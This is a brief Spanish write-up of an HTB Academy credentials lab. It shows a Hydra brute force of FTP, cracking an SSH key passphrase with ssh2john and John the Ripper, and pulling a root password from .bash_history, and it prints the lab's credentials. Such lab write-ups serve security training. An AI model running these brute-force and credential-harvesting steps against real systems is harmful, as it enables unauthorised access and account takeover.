# Resolution lab1 - Credentials HTB Academy

- Encontramos puertos 21 y 22

- Hacemos fuerza bruta
	```bash
	hydra -L username.list -P password.list ftp://$target -t 50
	```
	encontrando creds: `mike:7777777`

- Al acceder por ftp encontramos un archivo `id_rsa`, que está protegido por contraseña. Aplicamos nuevamente fuerza bruta sobre este archivo
	```bash
	ssh2john id_rsa > ssh.hash
	```

	```bash
	john --wordlist=/usr/share/wordlists/rockyou.txt.1 ssh.hash
	```
	obteniendo que la contraseña es `7777777`

- Accedemos por `ssh`
	```bash
	ssh -i id_rsa mike@$target
	```
- Encontramos en `.bash_history` una línea con la siguiente información:

	```textplain
	analysis.py -u root -p dgb6fzm0ynk@AME9pqu
	```

